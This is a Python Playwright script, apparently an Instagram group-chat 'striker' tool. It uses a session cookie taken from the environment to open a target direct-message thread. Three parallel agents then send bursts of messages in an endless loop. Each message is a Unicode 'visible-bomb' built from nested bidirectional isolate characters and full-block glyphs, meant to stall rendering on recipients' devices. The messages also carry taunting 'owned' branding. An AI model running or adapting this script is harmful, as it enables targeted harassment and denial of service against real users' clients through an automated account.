# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (VISIBLE-DEPTH V8)
# 📅 STATUS: HIGH-VISIBILITY | 20-MPS | TOTAL-LOCK

import os, asyncio, random, sys
from playwright.async_api import async_playwright

AGENT_COUNT = 3 

def get_visible_payload(agent_id):
    """Combines high-visibility branding with recursive layout isolates."""
    u_id = random.randint(100000, 999999)
    # The 'Glue' ensures the browser treats the block as one unit
    glue = "\u2060" 
    
    # 💥 HIGH-VISIBILITY HEADER (Full-Width + Bold)
    header = f"👑_ＰＲＡＶＥＥＲ_ＰＡＰＡ_👑{glue}☠️_ＴＥＡＭ_ＤＥＶＥＬ_ＯＷＮＥＤ_☠️{glue}🆔_{u_id}{glue}"
    
    # 🏗️ THE 'VISIBLE-BOMB'
    # We use \u2588 (Full Block) and \u2067 (RLI)
    # This creates a solid wall of text that is mathematically impossible to render quickly.
    body = []
    for i in range(150):
        # We alternate the direction inside the nest
        nest = "\u2067" if i % 2 == 0 else "\u2068"
        # █ creates a heavy rasterization workload
        body.append(f"{nest}█𝕻𝕬𝕻𝕬_𝕺𝖂𝕹𝕿_█\u2069")
        
    return (header + glue.join(body))[:9990]

async def run_striker(agent_id, context, target_id):
    await asyncio.sleep(agent_id * 5) 
    page = await context.new_page()
    # Block media but allow fonts so YOU can see the impact
    await page.route("**/*.{png,jpg,jpeg,svg,mp4}", lambda route: route.abort())
    
    try:
        print(f"📡 [M-{os.environ.get('MACHINE_ID')}|A-{agent_id}] Initializing Visible Strike...")
        await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="commit", timeout=120000)
        
        while True:
            try:
                box = page.get_by_role("textbox", name="Message")
                await box.wait_for(state="visible", timeout=30000)

                for _ in range(35):
                    payload = get_visible_payload(agent_id)
                    await box.fill(payload)
                    await page.keyboard.press("Enter")
                    print(f"💀 [M-{os.environ.get('MACHINE_ID')}] Agent-{agent_id} Visible-Impact Sent")
                    await asyncio.sleep(0.3) 
                
                await asyncio.sleep(4) 

            except Exception:
                await asyncio.sleep(5)
                if not await page.get_by_role("textbox", name="Message").is_visible():
                    await page.reload(wait_until="commit")

    except Exception as e:
        print(f"❌ [Agent-{agent_id}] Offline: {str(e)[:50]}")

async def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"])
        context = await browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])
        tasks = [run_striker(i+1, context, target_id) for i in range(AGENT_COUNT)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
